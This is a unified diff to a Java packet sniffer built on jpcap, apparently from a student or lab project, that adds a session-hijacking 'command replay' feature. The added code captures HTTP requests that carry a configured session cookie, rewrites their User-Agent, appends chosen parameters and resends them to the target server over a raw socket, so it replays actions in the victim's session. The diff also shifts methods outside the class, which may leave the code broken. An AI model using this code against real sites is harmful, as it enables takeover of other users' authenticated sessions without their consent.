@@ -7,8 +7,13 @@ import java.io.File;
 import java.io.FileOutputStream;
 import java.io.FileWriter;
 import java.io.IOException;
+import java.io.OutputStream;
 import java.io.StringReader;
+import java.net.Socket;
 import java.util.ArrayList;
+
+import SessionHijack.CommandReplay;
+import SessionHijack.CommandReplayConfiguration;
 import jpcap.packet.Packet;
 import jpcap.packet.TCPPacket;
 import jpcap.JpcapCaptor;
@@ -29,8 +34,10 @@ public class Sniffer implements PacketReceiver {
 	private boolean isPostMessage;
 	private boolean isGetMessage;
 	private boolean isHeadMessage;
+	private CommandReplayConfiguration config;
+	private Socket theSocket;
 
-	public Sniffer(int device) {
+	public Sniffer(int device, CommandReplayConfiguration config) {
 		this.requestCount = 0;
 		this.deviceNumber = device;
 		this.requestMessages = new ArrayList <RequestMessage> (REQUEST_LIMIT);
@@ -40,6 +47,8 @@ public class Sniffer implements PacketReceiver {
 		this.isGetMessage = false;
 		this.isHeadMessage = false;
 		this.isPostMessage = false;
+		this.config = config;
+
 	}
 
 	public void start() {
@@ -48,7 +57,7 @@ public class Sniffer implements PacketReceiver {
 			System.out.println("Device: " + devices[deviceNumber].description);
 			jpcap = JpcapCaptor.openDevice(devices[deviceNumber], 2000, false, 20);
 			jpcap.setFilter("tcp", true);
-			jpcap.loopPacket(-1, new Sniffer(deviceNumber));
+			jpcap.loopPacket(-1, new Sniffer(deviceNumber, config));
 		}
 
 		catch (IOException e) {
@@ -75,7 +84,7 @@ public class Sniffer implements PacketReceiver {
 			+ req.getDst_ip() + "_"
 			+ req.getHeaders().split("\\s")[1].split("\\?")[0] + "_"
 			+ req.getTimestamp();
-			
+
 			System.out.println(">> " + folderName);
 		}
 
@@ -85,7 +94,7 @@ public class Sniffer implements PacketReceiver {
 			+ req.getHeaders().split("\\s")[1] + "_"
 			+ req.getTimestamp();
 		}
-		
+
 		folderName = folderName.replace("/", "-");
 		folderName = folderName.replace("?", "-");
 		folderName = folderName.replace("\\", "-");
@@ -97,7 +106,7 @@ public class Sniffer implements PacketReceiver {
 		folderName = folderName.replace("|", "-");
 
 		System.out.println(">> " + folderName);
-		
+
 		new File(folderName).mkdir();
 
 		return folderName;
@@ -109,7 +118,7 @@ public class Sniffer implements PacketReceiver {
 		if(req.getHeaders().contains("\\?") && isGetMessage){
 			parameters = req.getHeaders().split("\\s")[1].split("\\?")[1].split("\\&");
 		}
-		
+
 		if(req.getHeaders().split("\\s")[0].equals("POST")) {
 			System.out.println(">>" + req.getParameters());
 			parameters = req.getParameters().split("\\|");
@@ -176,7 +185,7 @@ public class Sniffer implements PacketReceiver {
 			}
 
 			bw.close();
-			
+
 			completeReqResCount++;
 
 			return folderName;
@@ -258,178 +267,237 @@ public class Sniffer implements PacketReceiver {
 				// read the application layer information (HTTP-related)
 				// if request push into the request array
 				if(checkIfRequest(temp) && requestCount < REQUEST_LIMIT) {
+					boolean sameURL = false;
+					boolean sameCookie = false;
+					boolean sameParameters = false;
 					requestCount++;
 					System.out.println("[" + temp + "]");
 					while((temp = br.readLine()) != null && temp.getBytes().length > 0) {
 						System.out.println("[" + temp + "]");
+
+						if(temp.contains("Referer")){
+							if(temp.split("Referer: ")[1].equals(config.getApplicationURL())){
+//								System.out.println("app url: " + config.getApplicationURL());
+//								System.out.println("referer: " + temp.split("Referer: ")[1]);
+								sameURL = true;
+							}
+						}
+
+						if(temp.contains("Cookie") && sameURL){
+							if(temp.split("Cookie: ")[1].contains(config.getSessionCookieName())){
+								sameCookie = true;
+							}
+						}
+						
+						if(temp.contains("User-Agent: NANO&ALPER")) {
+							System.out.println("hijacked request!");
+							return;
+						}
+
 						message = message + temp + "[NEWLINE]";
 					}
 
 					System.out.println("HTTP REQ > seq: " + tempPacket.sequence + " | ack: " + tempPacket.ack_num);
-					
+
 					String parameters = "";
 					if(isPostMessage) {
 						System.out.println(">POST<");
 						temp = br.readLine();
+
 						while(temp != null) {
+							
+							if(temp.contains(config.getRequestParameterName() + "=" + config.getRequestParameterValue()) && sameCookie){
+								sameParameters = true;
+							}
+							
 							parameters += temp + "|";
 							System.out.println(parameters);
 							temp = br.readLine();
 						}
 					}
 
-					message = message.trim();
-					RequestMessage req = new RequestMessage(tempPacket.src_ip.getHostAddress(), tempPacket.src_port, tempPacket.dst_ip.getHostAddress(), tempPacket.dst_port, java.lang.System.currentTimeMillis(), message, tempPacket.sequence + tempPacket.data.length, parameters);
-					req.setFolderName(createFolder(req));
-					incompleteRequestMessages.add(req);
-					
-					System.out.println();
-				}
+					if(sameParameters){
+						String tempMessage = message;
+						theSocket = new Socket(tempPacket.dst_ip, tempPacket.dst_port);
+						DataOutputStream dos = new DataOutputStream(theSocket.getOutputStream());
 
-				// else push into the response array
-				else if(checkifResponse(temp)) {
-					RequestMessage matchingRequest = responseExpected(tempPacket);
-					boolean notModifiedResponse = false;
-					
-					byteCount = 0;
-					byteCount += temp.getBytes().length + LF_LENGTH + CR_LENGTH;
-					
-					if(matchingRequest != null) {
-						/* ====================== header ========================= */
+						// find and modify user-agent in message
+						String userAgentField = new String("User-Agent: ");
+						int indexOfUserAgentField = message.indexOf(userAgentField);
+						int indexOfNewline = message.indexOf("[NEWLINE]", indexOfUserAgentField);
+						
+						tempMessage = new StringBuilder(tempMessage).replace(indexOfUserAgentField, indexOfNewline, "User-Agent: NANO&ALPER").toString();
+						String tempMessageArray[] = tempMessage.split("\\[NEWLINE\\]");
+						
+						String otherTempMessage = "";
+						for(int i = 0; i < tempMessageArray.length; i++) {
+							if(tempMessageArray[i].contains("|")) {
+								String t[] = tempMessageArray[i].split("\\|");
+								otherTempMessage += t[0] + "\r\n" + t[1] + "\r\n";
+								continue;
+							}
+							
+							otherTempMessage += tempMessageArray[i] + "\r\n";
+						}
+						
+						otherTempMessage += "\r\n" + config.getRequestParameterName() + "=" + config.getRequestParameterValue();
+						
+						System.out.println("-------------------------------");
+						System.out.println(otherTempMessage);
+						System.out.println("-------------------------------");
+						dos.write(otherTempMessage.getBytes());
+					}
+
+				message = message.trim();
+				RequestMessage req = new RequestMessage(tempPacket.src_ip.getHostAddress(), tempPacket.src_port, tempPacket.dst_ip.getHostAddress(), tempPacket.dst_port, java.lang.System.currentTimeMillis(), message, tempPacket.sequence + tempPacket.data.length, parameters);
+				req.setFolderName(createFolder(req));
+				incompleteRequestMessages.add(req);
+			}
+
+			// else push into the response array
+			else if(checkifResponse(temp)) {
+				RequestMessage matchingRequest = responseExpected(tempPacket);
+				boolean notModifiedResponse = false;
+
+				byteCount = 0;
+				byteCount += temp.getBytes().length + LF_LENGTH + CR_LENGTH;
+
+				if(matchingRequest != null) {
+					/* ====================== header ========================= */
+					System.out.println("[" + temp.getBytes().length + "]" + temp);
+					while((temp = br.readLine()).length() > 0) {
+						// if not modified since last time
+						if(byteCount == temp.getBytes().length + LF_LENGTH + CR_LENGTH && temp.split("\\s")[2].equals("304")){
+							notModifiedResponse = true;
+						}
+
+						if(temp.startsWith("Content-Length:")) {
+							contentLength = Integer.parseInt(temp.split(": ")[1]);
+						}
+
+						byteCount += temp.getBytes().length + LF_LENGTH + CR_LENGTH;
 						System.out.println("[" + temp.getBytes().length + "]" + temp);
-						while((temp = br.readLine()).length() > 0) {
-							// if not modified since last time
-							if(byteCount == temp.getBytes().length + LF_LENGTH + CR_LENGTH && temp.split("\\s")[2].equals("304")){
-								notModifiedResponse = true;
-							}
-							
-							if(temp.startsWith("Content-Length:")) {
-								contentLength = Integer.parseInt(temp.split(": ")[1]);
-							}
-							
-							byteCount += temp.getBytes().length + LF_LENGTH + CR_LENGTH;
-							System.out.println("[" + temp.getBytes().length + "]" + temp);
-							message = message + temp + "[NEWLINE]";
-						}
+						message = message + temp + "[NEWLINE]";
+					}
 
-						System.out.println(">" + temp + "<");
-						byteCount += LF_LENGTH + CR_LENGTH;
-						
-						/* ====================== data ========================= */
-						System.out.println("HTTP RES > seq: " + tempPacket.sequence + " | ack: " + tempPacket.ack_num);
+					System.out.println(">" + temp + "<");
+					byteCount += LF_LENGTH + CR_LENGTH;
 
-						message = message.trim();
-						ResponseMessage response = new ResponseMessage(tempPacket.dst_ip.getHostAddress(), tempPacket.dst_port, tempPacket.src_ip.getHostAddress(), tempPacket.src_port, message, contentLength, tempPacket.data.length - byteCount);
-						responseMessages.add(response);
+					/* ====================== data ========================= */
+					System.out.println("HTTP RES > seq: " + tempPacket.sequence + " | ack: " + tempPacket.ack_num);
 
-						if(notModifiedResponse) {
-							writeMetadata(matchingRequest, new ResponseMessage(tempPacket.dst_ip.getHostAddress(), tempPacket.dst_port, tempPacket.src_ip.getHostAddress(), tempPacket.src_port, message, contentLength, tempPacket.data.length - byteCount), matchingRequest.getFolderName());
-							incompleteRequestMessages.remove(matchingRequest);
-							return;
-						}
+					message = message.trim();
+					ResponseMessage response = new ResponseMessage(tempPacket.dst_ip.getHostAddress(), tempPacket.dst_port, tempPacket.src_ip.getHostAddress(), tempPacket.src_port, message, contentLength, tempPacket.data.length - byteCount);
+					responseMessages.add(response);
 
-						writeData(tempPacket.data, byteCount, tempPacket.data.length - byteCount, matchingRequest.getFolderName());
+					if(notModifiedResponse) {
+						writeMetadata(matchingRequest, new ResponseMessage(tempPacket.dst_ip.getHostAddress(), tempPacket.dst_port, tempPacket.src_ip.getHostAddress(), tempPacket.src_port, message, contentLength, tempPacket.data.length - byteCount), matchingRequest.getFolderName());
 						incompleteRequestMessages.remove(matchingRequest);
+						return;
+					}
 
-						if(response.getContentLength() <= tempPacket.data.length - byteCount) {
-							writeMetadata(matchingRequest, response, matchingRequest.getFolderName());
-						}
-						
-						else {
-							requestMessages.add(matchingRequest);
-							response.setMatchingRequestMessageIndex(requestMessages.indexOf(matchingRequest));
-						}
+					writeData(tempPacket.data, byteCount, tempPacket.data.length - byteCount, matchingRequest.getFolderName());
+					incompleteRequestMessages.remove(matchingRequest);
+
+					if(response.getContentLength() <= tempPacket.data.length - byteCount) {
+						writeMetadata(matchingRequest, response, matchingRequest.getFolderName());
+					}
+
+					else {
+						requestMessages.add(matchingRequest);
+						response.setMatchingRequestMessageIndex(requestMessages.indexOf(matchingRequest));
 					}
 				}
 			}
-
-			catch (Exception e) {
-//				System.out.println("[E] Failed to parse the TCP packet.");
-				e.printStackTrace();
-			}
 		}
-	}
 
-	private void writeData(byte[] data, int offset, int length, String folder) {
-		// write the data			
-		try {
-			// append data to the file
-			FileOutputStream fo = new FileOutputStream(new File(folder + File.separator + "data"), true);
-			DataOutputStream dos = new DataOutputStream(fo);
-			dos.write(data, offset, length);
-			dos.close();
-
-		}
-		
-		catch (IOException e) {
+		catch (Exception e) {
+//			System.out.println("[E] Failed to parse the TCP packet.");
 			e.printStackTrace();
 		}
 	}
+}
 
-	private RequestMessage responseExpected(TCPPacket tempPacket) {
-		int count;		
-		for(count = 0; count < incompleteRequestMessages.size(); count++) {
-			String src_ip = incompleteRequestMessages.get(count).getSrc_ip();
-			String src_port = Integer.toString(incompleteRequestMessages.get(count).getSrc_port());
-			String dst_ip = incompleteRequestMessages.get(count).getDst_ip();
-			String dst_port = Integer.toString(incompleteRequestMessages.get(count).getDst_port());
+private void writeData(byte[] data, int offset, int length, String folder) {
+	// write the data			
+	try {
+		// append data to the file
+		FileOutputStream fo = new FileOutputStream(new File(folder + File.separator + "data"), true);
+		DataOutputStream dos = new DataOutputStream(fo);
+		dos.write(data, offset, length);
+		dos.close();
 
-//			System.out.println("." + src_ip + ".=." + tempPacket.dst_ip.getHostAddress() + ".");
-//			System.out.println("." + src_port + ".=." + tempPacket.dst_port + ".");
-//			System.out.println("." + dst_ip + ".=." + tempPacket.src_ip.getHostAddress() + ".");
-//			System.out.println("." + dst_port + ".=." + tempPacket.src_port + ".");
-			
-			if(src_ip.equals(tempPacket.dst_ip.getHostAddress())
-					&& src_port.equals(Integer.toString(tempPacket.dst_port))
-					&& dst_ip.equals(tempPacket.src_ip.getHostAddress())
-					&& dst_port.equals(Integer.toString(tempPacket.src_port))) {
-				
-				System.out.println("." + tempPacket.ack_num + ".=." + incompleteRequestMessages.get(count).getExpectedAck());
-				
-				// if the packet is out of order; discard
-				if(tempPacket.ack_num == incompleteRequestMessages.get(count).getExpectedAck()) {
-					incompleteRequestMessages.get(count).setExpectedAck(tempPacket.ack_num);
-					return incompleteRequestMessages.get(count);
-				}
+	}
+
+	catch (IOException e) {
+		e.printStackTrace();
+	}
+}
+
+private RequestMessage responseExpected(TCPPacket tempPacket) {
+	int count;		
+	for(count = 0; count < incompleteRequestMessages.size(); count++) {
+		String src_ip = incompleteRequestMessages.get(count).getSrc_ip();
+		String src_port = Integer.toString(incompleteRequestMessages.get(count).getSrc_port());
+		String dst_ip = incompleteRequestMessages.get(count).getDst_ip();
+		String dst_port = Integer.toString(incompleteRequestMessages.get(count).getDst_port());
+
+//		System.out.println("." + src_ip + ".=." + tempPacket.dst_ip.getHostAddress() + ".");
+//		System.out.println("." + src_port + ".=." + tempPacket.dst_port + ".");
+//		System.out.println("." + dst_ip + ".=." + tempPacket.src_ip.getHostAddress() + ".");
+//		System.out.println("." + dst_port + ".=." + tempPacket.src_port + ".");
+
+		if(src_ip.equals(tempPacket.dst_ip.getHostAddress())
+				&& src_port.equals(Integer.toString(tempPacket.dst_port))
+				&& dst_ip.equals(tempPacket.src_ip.getHostAddress())
+				&& dst_port.equals(Integer.toString(tempPacket.src_port))) {
+
+			System.out.println("." + tempPacket.ack_num + ".=." + incompleteRequestMessages.get(count).getExpectedAck());
+
+			// if the packet is out of order; discard
+			if(tempPacket.ack_num == incompleteRequestMessages.get(count).getExpectedAck()) {
+				incompleteRequestMessages.get(count).setExpectedAck(tempPacket.ack_num);
+				return incompleteRequestMessages.get(count);
 			}
 		}
-
-		return null;
 	}
 
-	private boolean checkifResponse(String s) {
-		/**
-		 * the first line` of a response message is called the status-line.
-		 * for more information see: http://web-sniffer.net/rfc/rfc2616.html#section-6.1
-		 * ---
-		 * Status-Line = HTTP-Version SP Status-Code SP Reason-Phrase CRLF
-		 */
-		boolean result = false;
+	return null;
+}
 
-		if(s.startsWith("HTTP/1.0") || s.startsWith("HTTP/1.1")) {
-			result = true;
-		}
+private boolean checkifResponse(String s) {
+	/**
+	 * the first line` of a response message is called the status-line.
+	 * for more information see: http://web-sniffer.net/rfc/rfc2616.html#section-6.1
+	 * ---
+	 * Status-Line = HTTP-Version SP Status-Code SP Reason-Phrase CRLF
+	 */
+	boolean result = false;
 
-		return result; 
+	if(s.startsWith("HTTP/1.0") || s.startsWith("HTTP/1.1")) {
+		result = true;
 	}
 
-	private boolean checkIfRequest(String s) {
-		isGetMessage = false;
-		isHeadMessage = false;
-		isPostMessage = false;
-		
-		if(s.startsWith("GET")) {
-			isGetMessage = true;
-		}
-		
-		else if(s.startsWith("HEAD")) {
-			isHeadMessage = true;
-		}
-		
-		else if(s.startsWith("POST")) {
-			isPostMessage = true;
-		}
+	return result; 
+}
 
-		return (isGetMessage || isHeadMessage || isPostMessage);
+private boolean checkIfRequest(String s) {
+	isGetMessage = false;
+	isHeadMessage = false;
+	isPostMessage = false;
+
+	if(s.startsWith("GET")) {
+		isGetMessage = true;
 	}
+
+	else if(s.startsWith("HEAD")) {
+		isHeadMessage = true;
+	}
+
+	else if(s.startsWith("POST")) {
+		isPostMessage = true;
+	}
+
+	return (isGetMessage || isHeadMessage || isPostMessage);
+}
 }
